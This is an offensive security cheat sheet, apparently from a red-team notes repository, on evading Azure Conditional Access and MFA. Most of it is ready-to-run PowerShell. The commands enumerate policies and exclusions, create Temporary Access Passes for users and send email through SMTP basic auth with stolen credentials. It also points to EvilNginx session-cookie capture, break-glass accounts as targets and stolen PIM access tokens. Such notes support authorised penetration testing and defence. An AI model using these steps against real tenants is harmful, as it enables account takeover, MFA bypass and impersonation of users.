## Defense Evasion
* [Conditional Access](#Conditional-Access)
  * [Enumeration](#Enumeration)
  * [Bypasses](#Bypasses)
    * [Read policies and find exclusions](#Read-policies-and-find-exclusions)
    * [Configure MFA for user](#Configure-MFA-for-user)
    * [Temporary Access Pass](#Temporary-Access-Pass)
    * [Certificate Authentication](#Certificate-Authentication)
    * [Basic Authentication](#Basic-Authentication)
    * [Use access token PIM](#Use-access-token-PIM)
    * [EvilNginx](#EvilNginx)
    * [Break glass accounts](#Break-glass-accounts)
* [Privileged Identity Management](#Privileged-Identity-Management)

## Conditional Access
### Enumeration
#### MFASweep
- https://github.com/dafthack/MFASweep
- Blogpost: https://www.blackhillsinfosec.com/exploiting-mfa-inconsistencies-on-microsoft-services/

```
Import-Module MFASweep.ps1
Invoke-MFASweep -Username <EMAIL> -Password <PASSWORD>
```

#### AAD Graph
 - Deprecated (still working) AAD graph API works with normal user account (No workload identity)
- Using the following URL: `https://graph.windows.net/<ORG>/conditionalAccessPolicies?api-version=1.61-internal`

- Using Graphrunner
```
Invoke-DumpCAPS -Tokens $tokens -ResolveGuids
```

- Manually
```
$TenantID = ""
$AadGraphAccessToken = ""

$URI = "https://graph.windows.net/$TenantID/conditionalAccessPolicies?api-version=1.61-internal"
$RequestParams = @{ 
	Method = 'GET' 
	Uri = $URI 
	Headers = @{ 
		'Authorization' = "Bearer $AadGraphAccessToken"
	}
}

(Invoke-RestMethod @RequestParams).value | ForEach-Object {
	[PSCustomObject]@{
		DisplayName = $_.displayName
		State = ($_.definition | ConvertFrom-Json).State
		Definition = $_.definition
	}
} | fl
```

#### MgGraph
- Permissions required for authenticated enumeration using MS Graph any of the following:
	- Roles: Security Reader, Global Reader, Security Administrator, Conditional Access Administrator or Global Administrator
	- Application permissions: `Policy.Read.ConditionalAccess`, `Policy.ReadWrite.ConditionalAccess`, `Policy.Read.All`
	- Microsoft Graph: `Policy.Read.ConditionalAccess`, `AuditLog.Read.All`, `Directory.Read.Al`
- Check well known app ids [here](https://learn.microsoft.com/en-us/troubleshoot/azure/entra/entra-id/governance/verify-first-party-apps-sign-in#application-ids-of-commonly-used-microsoft-applications)
```
Get-MgIdentityConditionalAccessPolicy | fl

Get-MgIdentityConditionalAccessPolicy | ConvertTo-Json

Get-MgIdentityConditionalAccessPolicy | ConvertTo-Json | Out-File -FilePath ConditionalAccessPolicies.json

(Get-MgIdentityConditionalAccessPolicy).Conditions.Users | fl

# CHECK FOR SPECIFIC GROUP
Get-MgIdentityConditionalAccessPolicy | ?{$_.Conditions.Users.IncludeGroups -eq '<GROUP ID>'} | fl

Get-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId <ID> | ConvertTo-Json
```

### Bypasses
### Read policies and find exclusions
- Excluded cloud apps
- Excluded groups or users
- Excluded locations, countries etc.

#### Change User Agent
- With developer tools or proxy
- Or with plugin: https://addons.mozilla.org/en-US/firefox/addon/custom-user-agent-revived/

#### Edge
- Open Developer tools with `F12`. Press `CTRL + SHIFT + M`.
- Click on `Dimension: Responsive` and select `Edit`. Click `Add custom device...`
- Add the desired name and user agent string and dimension. Example:

```
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15 Edg/100.0.4896.127
Dimensions: 1200x1200
```

### Configure MFA for user
- Login with the discovered credentials and check if MFA is required or can be setup. If not configured yet you can configure MFA!

### Temporary Access Pass
- Time limited passcode that can be used for single or multiple apps
- Satisfies MFA requirements (strong authentication in CAPs)
	- Is preferred over Identity Provier (idP) in federated domains (adfs), and works across tenants
- Create temp pass:
	- Global Administrators, Privileged Authentication Administrators, Authentication Administrators or permissions `UserAuthenticationMethod.ReadWriteAll`
- Read TAP policy
	- A global reader or role with `Policy.Read.All` can read TAP policy

#### Check if PAS is enabled
```
(Get-MgPolicyAuthenticationMethodPolicy).AuthenticationMethodConfigurations
```

#### Gather policy
```
(Get-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration -AuthenticationMethodConfigurationId TemporaryAccessPass).AdditionalProperties
```

#### Check users which can use TAP
```
(Get-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration -AuthenticationMethodConfigurationId TemporaryAccessPass).AdditionalProperties.includeTargets
```

#### Check the group
```
Get-MgGroup -GroupId <OBJECT ID>
```

#### Check members of group
```
Get-MgGroupMember -GroupId <OBJECT ID> | select Id, @{Name='userPrincipalName';Expression={$_.AdditionalProperties.userPrincipalName}} | fl
```

#### Create one time use TAP
```
$properties = @{}
$properties.isUsableOnce = $True
$properties.startDateTime = (Get-Date).AddMinutes(60)
$propertiesJSON = $properties | ConvertTo-Json

$data = New-MgUserAuthenticationTemporaryAccessPassMethod -UserId <USER ID> -BodyParameter $propertiesJSON | fl

$data
```

#### Login to Microsoft Service
- https://portal.azure.com

### Certificate Authentication
- Certificate Authentication is part of the Phishing resistant MFA authentication strength
- Known as `x509CertificateMultiFactor` in the conditional access policies configuration
- Requires a certificate (`.pfx`) file of a user

1. Import the certificate by double clicking the `.pfx` file and enter the password
2. Enter the username and click on the Next button
3. Select the certificate and click on "OK"


### Basic Authentication
- Basic authentication cannot have MFA or conditional access
- Disabled since October 2022

### SMTP
- SMTP auth uses basic auth
- Configured on tenant level but can be overwritten by per user basis
- Can be used to send emails since basic auth doesn't require MFA.
- Not possible to enumerate with MFASweep of other tools as of writing in cheatsheet

#### Import and auth ExchangeOnline module
```
Import-Module ExchangeOnlineManagement
Connect-ExchangeOnline -UserPrincipalName <UPN>
```

#### Check if SMTP auth is disabled tenant wide
- Requires Global Reader or Security Reader Roles
- `True` = disabled, `false` = enabled

```
Get-TransportConfig | Select-Object SmtpClientAuthenticationDisabled
```

#### Check if it is enabled for a mailbox
- Requires Global Reader or Security Reader Roles
- `null` and `true` = disabled, `False` = enabled

```
Get-CASMailbox -Identity <MAILBOX> | Select-Object SmtpClientAuthenticationDisabled
```

#### List all users with SMTP auth enabled
- Requires Global Reader or Security Reader Roles

```
Get-CASMailbox -ResultSize unlimited | Where-Object {$_.SmtpClientAuthenticationDisabled -eq $false}
```

#### Send mail through SMTP auth
```
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<UPN USER>', $password)

## Define the Send-MailMessage parameters
$mailParams = @{
	SmtpServer = 'smtp.office365.com'
	Port = '587'
	UseSSL = $true
	Credential = $creds
	From = '<UPN USER>'
	To = '<TARGET EMAIL>'
	Subject = "<SUBJECT>"
	Body = '<MAIL MESSAGE>'
	DeliveryNotificationOption = 'OnFailure', 'OnSuccess'
}

Send-MailMessage @mailParams -Verbose
```

### Use access token PIM
- [Link to PIM section](#Privileged-Identity-Management)

### EvilNginx
- EvilNginx can capture session cookies by proxying the azure login, capturing credentials an cookies
- [Link to EvilNginx](/cloud/azure/initial-access-attacks.md#Evilginx2)

### Break glass accounts
- Another PrivEsc target is Azure “Break Glass” administrative accounts
- Microsoft recommends not setting up MFA for them
- Two accounts are usually recommended to be set up
- If you can determine which ones are the break glass they can be good targets

## Privileged Identity Management
#### Check if PIM is in use
- Open the current roles of the user and check for "Eligible Assignments"
- Open the `Privileged Identity Management` page in the portal and the "My Roles" tab.

#### List eligible role assignments
- Requires `RoleManagement.Read.All`

```
$Spacing = "------------------------------------------------------------------------------------------"; Get-MgRoleManagementDirectoryRoleEligibilityScheduleInstance -ExpandProperty "*" -All | ForEach-Object {echo $Spacing; Get-MgDirectoryObjectById -Ids $_.PrincipalId | Select-Object -ExpandProperty AdditionalProperties; $roleDef = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId; [PSCustomObject]@{RoleDisplayName = $roleDef.DisplayName; RoleId = $roleDef.Id; MemberType = $_.MemberType; DirectoryScopeId = $_.DirectoryScopeId} | fl; echo $Spacing;}
```

#### MFA bypass wait for role activation
- If a user's access token is stolen and they activate a role in PIM.
	- MFA is not enforced on the stolen access token
	- Privileges of the new activated role are available with the stolen access token

#### Use access token
- Check the enumeration page to login with access tokens
